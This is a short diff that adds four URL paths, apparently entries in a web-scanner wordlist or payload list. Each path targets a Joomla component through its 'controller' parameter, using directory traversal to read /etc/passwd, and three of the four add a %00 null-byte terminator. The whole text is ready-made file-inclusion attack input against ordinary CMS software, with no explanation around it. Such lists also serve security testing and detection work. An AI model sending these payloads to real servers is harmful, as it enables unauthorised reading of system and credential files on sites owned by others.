@@ -1,0 +1,4 @@
+/index.php?option=com_cartweberp&controller=../../../../../../../../etc/passwd
+/index.php?option=com_userstatus&controller=../../../../../../../../../../etc/passwd%00
+/index.php?option=com_jinventory&controller=../../../../../../../../../../etc/passwd%00
+/index.php?option=com_weberpcustomer&controller=../../../../../../../../../../etc/passwd%00
